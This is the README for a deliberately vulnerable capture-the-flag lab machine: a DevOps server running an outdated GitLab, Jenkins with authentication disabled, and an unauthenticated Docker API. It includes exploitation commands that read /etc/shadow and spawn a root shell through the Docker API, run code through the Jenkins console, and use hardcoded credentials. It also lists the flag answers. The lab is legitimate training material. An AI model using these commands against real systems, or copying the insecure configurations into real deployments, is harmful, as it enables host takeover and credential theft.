# 🏢 VulnCorp — Machine 9: int-dev01 (DevOps Server)

> ⚠️ **FOR EDUCATIONAL / LAB USE ONLY — NEVER EXPOSE TO THE INTERNET**

> 📝 **IP Note:** All IP addresses below are placeholders. Change `192.168.1.30` and any other IPs to match your lab network layout before deploying.

Machine 9 is a DevOps server in the **Internal Zone (`192.168.1.30`)** running **GitLab CE (CVE-2021-22205)**, **Unsecured Jenkins**, and an **Unauthenticated Docker Daemon API exposed on 0.0.0.0:2375**.

---

## 🚀 Quick Start (One-Command Deploy)

Run this on your **Ubuntu 24 VM** (`192.168.1.30`):

```bash
git clone https://github.com/YOUR_GITHUB_USERNAME/webserver.git
cd webserver/machines/int-dev01

chmod +x deploy.sh
sudo ./deploy.sh
```

---

## 📡 Exposed Ports & Services

| Service | Host Port | Description | Vulnerability |
|---------|-----------|-------------|---------------|
| **GitLab CE** | `80` | GitLab 14.0.12 | Vulnerable to **CVE-2021-22205** (RCE via ExifTool djvu file), root password `gitlab_root_pass` |
| **Jenkins** | `8080` | CI/CD Server | **Authentication Disabled** — Script Console allows instant system execution |
| **Docker Engine API** | `2375` | TCP Socket | **No TLS & No Authentication** — Container escape & root host filesystem mount |
| **SSH** | `2222` | OpenSSH | `developer`/`dev123` — avoids conflict with host SSH on port 22 |

---

## 🔍 Attack Vectors & Exploitation Guide

### 1. Docker API Unauthenticated RCE (Host Escape)
```bash
# Query Docker daemon
curl http://192.168.1.30:2375/version

# Mount host root filesystem and read shadow file
docker -H tcp://192.168.1.30:2375 run -v /:/host --rm alpine cat /host/etc/shadow

# Spawn root shell on host
docker -H tcp://192.168.1.30:2375 run -v /:/host -it --rm alpine chroot /host /bin/bash
```

### 2. Jenkins Script Console RCE
Navigate to `http://192.168.1.30:8080/script` (no login required) and run Groovy code:
```groovy
println "id".execute().text
```

### 3. GitLab Hardcoded Secrets & CVE-2021-22205
Log into GitLab at `http://192.168.1.30` with `root` : `gitlab_root_pass` to find committed AWS keys, DB passwords, and Active Directory credentials.

### 4. SSH Access
```bash
ssh developer@192.168.1.30 -p 2222
# Password: dev123
```

---

## 🏆 Flags

- **Docker API RCE Flag:** `/root/root.txt` (`VULN{d0ck3r_api_rce}`)
- **DevOps Secrets Flag:** `/opt/dev_flag.txt` (`VULN{d3v0ps_s3cr3ts_l3ak3d}`)
